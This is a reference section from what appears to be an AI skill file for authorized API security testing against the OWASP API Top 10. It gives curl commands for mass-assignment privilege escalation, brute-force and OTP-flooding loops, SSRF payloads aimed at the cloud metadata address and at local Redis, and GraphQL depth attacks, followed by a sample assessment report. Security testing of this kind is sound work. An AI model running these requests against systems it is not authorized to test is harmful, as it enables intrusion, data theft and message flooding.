# testing-api-security-with-owasp-top-10 — 详细参考（由 SKILL.md 拆分）

### Step 4: Test API3 - Broken Object Property Level Authorization

Test for excessive data exposure and mass assignment vulnerabilities.

```bash
# Check for excessive data in responses
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/101" | jq .
# Look for: password hashes, SSNs, internal IDs, admin flags, PII

# Test mass assignment - try adding admin properties
curl -s -X PUT \
  -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","role":"admin","is_admin":true}' \
  "https://api.target.example.com/api/v1/users/101" | jq .

# Test with PATCH method
curl -s -X PATCH \
  -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","balance":999999}' \
  "https://api.target.example.com/api/v1/users/101" | jq .

# Check if filtering parameters expose more data
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/101?fields=all" | jq .
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/101?include=password,ssn" | jq .
```

### Step 5: Test API4/API6 - Rate Limiting and Unrestricted Access to Sensitive Flows

Verify rate limiting and resource consumption controls.

```bash
# Test rate limiting on authentication endpoint
for i in $(seq 1 100); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    "https://api.target.example.com/api/v1/auth/login")
  echo "Attempt $i: $status"
  if [ "$status" == "429" ]; then
    echo "Rate limited at attempt $i"
    break
  fi
done

# Test for unrestricted resource consumption
# Large pagination
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users?limit=100000&offset=0" | jq '. | length'

# GraphQL depth/complexity attack
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN_A" \
  -d '{"query":"{ users { friends { friends { friends { friends { name } } } } } }"}' \
  "https://api.target.example.com/graphql"

# Test SMS/email flooding via OTP endpoint
for i in $(seq 1 20); do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"phone":"+1234567890"}' \
    "https://api.target.example.com/api/v1/auth/send-otp"
done
```

### Step 6: Test API5 - Broken Function Level Authorization

Check for privilege escalation through administrative endpoints.

```bash
# Test admin endpoints with regular user token
ADMIN_ENDPOINTS=(
  "/api/v1/admin/users"
  "/api/v1/admin/settings"
  "/api/v1/admin/logs"
  "/api/v1/internal/config"
  "/api/v1/users?role=admin"
  "/api/v1/admin/export"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  for method in GET POST PUT DELETE; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -X "$method" \
      -H "Authorization: $TOKEN_A" \
      -H "Content-Type: application/json" \
      "https://api.target.example.com$endpoint")
    if [ "$status" != "403" ] && [ "$status" != "401" ] && [ "$status" != "404" ]; then
      echo "POTENTIAL ISSUE: $method $endpoint returned $status"
    fi
  done
done

# Test HTTP method switching
# If GET /admin/users returns 403, try:
curl -s -X POST -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/admin/users"
```

### Step 7: Test API7-API10 - SSRF, Misconfiguration, Inventory, and Unsafe Consumption

```bash
# API7: Server-Side Request Forgery
curl -s -X POST -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  "https://api.target.example.com/api/v1/fetch-url"

curl -s -X POST -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"webhook_url":"http://127.0.0.1:6379/"}' \
  "https://api.target.example.com/api/v1/webhooks"

# API8: Security Misconfiguration
# Check CORS policy
curl -s -I -H "Origin: https://evil.example.com" \
  "https://api.target.example.com/api/v1/users" | grep -i "access-control"

# Check for verbose error messages
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"invalid": "data' \
  "https://api.target.example.com/api/v1/users"

# Check security headers
curl -s -I "https://api.target.example.com/api/v1/health" | grep -iE \
  "(x-frame|x-content|strict-transport|content-security|x-xss)"

# API9: Improper Inventory Management
# Test deprecated API versions
for v in v0 v1 v2 v3; do
  curl -s -o /dev/null -w "$v: %{http_code}\n" \
    "https://api.target.example.com/api/$v/users"
done

# API10: Unsafe Consumption of APIs
# Test if the API blindly trusts third-party data
# Check webhook/callback implementations for injection
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **BOLA (API1)** | Broken Object Level Authorization - accessing objects belonging to other users |
| **Broken Authentication (API2)** | Weak authentication mechanisms allowing credential stuffing or token manipulation |
| **BOPLA (API3)** | Broken Object Property Level Authorization - excessive data exposure or mass assignment |
| **Unrestricted Resource Consumption (API4)** | Missing rate limiting enabling DoS or brute-force attacks |
| **Broken Function Level Auth (API5)** | Regular users accessing admin-level API functions |
| **SSRF (API7)** | Server-Side Request Forgery through API parameters accepting URLs |
| **Security Misconfiguration (API8)** | Missing security headers, verbose errors, permissive CORS |
| **Improper Inventory (API9)** | Undocumented, deprecated, or shadow API endpoints left exposed |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | API interception, scanning, and manual testing |
| **Postman** | API collection management and automated test execution |
| **ffuf** | API endpoint and parameter fuzzing |
| **Kiterunner** | API endpoint discovery using common API path patterns |
| **jwt_tool** | JWT token analysis, manipulation, and attack automation |
| **GraphQL Voyager** | GraphQL schema visualization and introspection analysis |
| **Arjun** | HTTP parameter discovery for API endpoints |

## Common Scenarios

### Scenario 1: BOLA in E-commerce API
User A can access User B's order details by changing the order ID in `/api/v1/orders/{id}`. The API only checks authentication but not authorization on the object level.

### Scenario 2: Mass Assignment on User Profile
The user update endpoint accepts a `role` field in the JSON body. By adding `"role":"admin"` to a profile update request, a regular user escalates to administrator privileges.

### Scenario 3: Deprecated API Version Bypass
The `/api/v2/users` endpoint has proper rate limiting, but `/api/v1/users` (still active) has no rate limiting. Attackers use the old version to brute-force credentials.

### Scenario 4: GraphQL Introspection Data Leak
GraphQL introspection is enabled in production, exposing the entire schema including internal queries, mutations, and sensitive field names that are not used in the frontend.

## Output Format

```
## API Security Assessment Report

**Target**: api.target.example.com
**API Type**: REST (OpenAPI 3.0)
**Assessment Date**: 2024-01-15
**OWASP API Security Top 10 (2023) Coverage**

| Risk | Status | Severity | Details |
|------|--------|----------|---------|
| API1: BOLA | VULNERABLE | Critical | /api/v1/orders/{id} - IDOR confirmed |
| API2: Broken Auth | VULNERABLE | High | No rate limit on /auth/login |
| API3: BOPLA | VULNERABLE | High | User role modifiable via mass assignment |
| API4: Resource Consumption | VULNERABLE | Medium | No pagination limit enforced |
| API5: Function Level Auth | PASS | - | Admin endpoints properly restricted |
| API6: Unrestricted Sensitive Flows | VULNERABLE | Medium | OTP endpoint lacks rate limiting |
| API7: SSRF | PASS | - | URL parameters properly validated |
| API8: Misconfiguration | VULNERABLE | Medium | Verbose stack traces in error responses |
| API9: Improper Inventory | VULNERABLE | Low | API v1 still accessible without docs |
| API10: Unsafe Consumption | NOT TESTED | - | No third-party API integrations found |

### Critical Finding: BOLA on Orders API
Authenticated users can access any order by iterating order IDs.
Tested range: 1-1000, 847 valid orders accessible.
PII exposure: names, addresses, payment details.
```
